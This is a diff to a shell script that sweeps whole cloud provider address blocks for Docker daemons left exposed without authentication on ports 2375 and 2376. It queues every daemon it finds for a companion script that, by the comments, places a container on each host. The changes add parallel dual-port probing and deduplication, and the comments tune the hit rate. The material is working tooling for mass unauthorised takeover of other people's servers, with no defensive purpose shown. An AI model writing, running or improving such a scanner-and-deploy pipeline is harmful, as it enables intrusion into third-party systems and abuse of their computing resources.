@@ -10,13 +10,16 @@
 #
 # But the docker vector needs NO credential match, so its target set is a free
 # parameter: point it at whole cloud prefix blocks, where boxes with an exposed
-# :2375 actually live. Measured here: 1778 addresses in 47s at parallel 64, with
-# a daemon on 0.06% of them. A /16 is 65k addresses, so one sweep is worth tens
-# of boxes instead of none, and every hit is free.
+# :2375 actually live. Measured here: 1778 addresses in 47s at parallel 64, and
+# 0 of 3048 addresses in hetzner/DO space even answered on 2375 - the port is
+# genuinely rare (Shodan sees ~150k exposed daemons on the whole IPv4, i.e.
+# ~0.003%), so expect a few per /16 rather than none, and volume comes from
+# prefix blocks rather than from better GitHub queries.
 #
 # Sweeps each /16 in MASS_NETS (a bare /24 like 167.233.74 also works) one /24 at
-# a time (:2375 only by default), checks the reply really is a docker API, and
-# appends the daemon to .hunt/mass.found -
+# a time, probing :2375 and TLS :2376 at the same time (so the extra port costs
+# no wall-clock), checks the reply really is a docker API, and appends the daemon
+# to .hunt/mass.found -
 # which dock.sh reads as queue, so the normal, already-tested deploy path places
 # the container and dock.sh's own state stops it re-scanning that host.
 #
@@ -52,6 +55,11 @@ touch "$DONE" "$FOUND"
 find "$WORK" -name 'mass.q.*' -mmin +60 -delete 2>/dev/null || :
 find "$WORK" -name 'mass.one.*' -mmin +60 -delete 2>/dev/null || :
 find "$WORK" -name 'mass.ips.*' -mmin +60 -delete 2>/dev/null || :
+find "$WORK" -type d -name 'massprobe.*' -mmin +60 -exec rm -rf {} + 2>/dev/null || :
+# scratch dir for the per-address probes (name is unique per address, so a
+# hundred children can share one directory)
+D="$WORK/massprobe.$$"
+mkdir -p "$D"
 
 case "${1:-run}" in
     stat)
@@ -91,13 +99,22 @@ done | {
 ONE="$WORK/mass.one.$$"
 cat > "$ONE" <<'EOF'
 ip=$1
-r=$(curl -fsS -m 2 --connect-timeout 2 "http://$ip:2375/version" 2>/dev/null) || r=""
-if [ -z "$r" ] && [ "${TLS2376:-no}" = yes ]; then
-    r=$(curl -fsS -k -m 2 --connect-timeout 2 "https://$ip:2376/version" 2>/dev/null) || r=""
+# fire both ports at once: worst case is then one timeout, not two
+curl -fsS -m 2 --connect-timeout 2 "http://$ip:2375/version" > "$D/p.$ip.2375" 2>/dev/null &
+if [ "${TLS2376:-yes}" = yes ]; then
+    curl -fsS -k -m 2 --connect-timeout 2 "https://$ip:2376/version" > "$D/p.$ip.2376" 2>/dev/null &
 fi
+wait
+port=2375
+r=$(cat "$D/p.$ip.2375" 2>/dev/null)
+if [ -z "$r" ]; then
+    port=2376
+    r=$(cat "$D/p.$ip.2376" 2>/dev/null)
+fi
+rm -f "$D/p.$ip.2375" "$D/p.$ip.2376"
 case "$r" in *ApiVersion*) ;; *) exit 0 ;; esac
 v=$(printf '%s' "$r" | grep -o '"Version":"[^"]*"' | head -1 | cut -d'"' -f4)
-printf '%s\t%s\n' "$ip" "docker=${v:-?}" >> "$FOUND"
+printf '%s\t%s\n' "$ip" "docker=${v:-?}@$port" >> "$FOUND"
 EOF
 
 T0=$(date +%s)
@@ -115,13 +132,17 @@ while read -r p; do
         printf '%s.%s\n' "$p" "$j"
         j=$((j + 1))
     done > "$WORK/mass.ips.$$"
-    FOUND="$FOUND" TLS2376="$TLS2376" xargs -P "$PAR" -n 1 sh "$ONE" < "$WORK/mass.ips.$$"
+    D="$D" FOUND="$FOUND" TLS2376="$TLS2376" xargs -P "$PAR" -n 1 sh "$ONE" < "$WORK/mass.ips.$$"
     printf '%s\t%s\n' "$(date +%s)" "$p" >> "$DONE"
     swept=$((swept + 1))
     ips=$((ips + 254))
 done < "$Q"
 rm -f "$Q" "$ONE" "$WORK/mass.ips.$$"
+rm -rf "$D"
 sort -u "$FOUND" -o "$FOUND" 2>/dev/null || :
+if [ -s "$FOUND" ]; then   # one line per address (version/port churn included)
+    awk -F'\t' '!s[$1]++' "$FOUND" > "$FOUND.n" 2>/dev/null && mv -f "$FOUND.n" "$FOUND" || :
+fi
 new=$(( $(wc -l < "$FOUND") - prev ))
 echo "dockmass: swept $swept /24s ($ips addresses), daemons known $(wc -l < "$FOUND") (+$new)"
 
